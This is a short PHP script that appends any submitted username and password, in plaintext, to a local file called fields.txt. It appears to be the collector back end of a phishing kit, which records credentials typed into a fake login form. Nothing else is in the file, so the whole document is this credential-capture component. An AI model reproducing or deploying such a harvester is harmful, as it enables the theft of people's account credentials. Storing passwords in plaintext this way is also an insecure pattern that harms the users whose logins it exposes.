<?php
if( isset($_POST['username'] ) && isset( $_POST['password'] ) )
{
    $txt= $_POST['username'].' - '.$_POST['password'] . PHP_EOL; 
    file_put_contents('fields.txt', $txt, FILE_APPEND);
}
?>